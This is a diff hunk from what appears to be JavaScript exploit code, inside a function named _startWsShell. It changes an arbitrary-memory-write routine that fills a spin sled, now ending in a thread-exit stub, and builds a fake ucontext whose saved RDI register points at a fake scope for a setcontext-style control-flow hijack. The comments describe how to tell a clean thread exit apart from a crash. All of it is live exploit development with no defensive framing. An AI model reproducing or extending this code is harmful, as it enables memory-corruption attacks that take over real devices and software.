@@ -5775,10 +5775,16 @@ function _startWsShell(){
           var sledSize=0x3000;
           var sledTop=sledBase+BigInt(sledSize);
           TC('3 spin=0x'+spinStub.toString(16)+' sled top=0x'+sledTop.toString(16));
-          /* zero the ucontext region + the sled */
+          /* zero the ucontext region + the sled - THE LAST SLED ENTRY
+           * = 0x3F0 (THR_EXIT - the confirmed clean thread-exit stub):
+           * a thr_create child exits cleanly (no crash - the reply
+           * posts + the tid witness); a setcontext-class main thread
+           * stalls (the user-observable discriminator vs the crash) */
           for(var zi=0;zi<0x600/8;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
-          for(var zi2=0;zi2<sledSize/8;zi2++)S.absWrite(sledBase+BigInt(zi2*8),spinStub);
-          TC('4 zeroed ctx + sled filled n='+(sledSize/8));
+          var fillN2=sledSize/8;
+          for(var zi2=0;zi2<fillN2-1;zi2++)S.absWrite(sledBase+BigInt(zi2*8),spinStub);
+          S.absWrite(sledBase+BigInt((fillN2-1)*8),B+0x3F0n); /* the LAST entry = thr_exit */
+          TC('4 zeroed ctx + sled filled n='+fillN2+' (last=thr_exit)');
           /* build the ucontext AT the fakeScope (RDI = the scope!) */
           var scratch=S.fakeScope+0x700n;
           S.absWrite(S.fakeScope+0x38n,scratch);   /* mc_rdi */
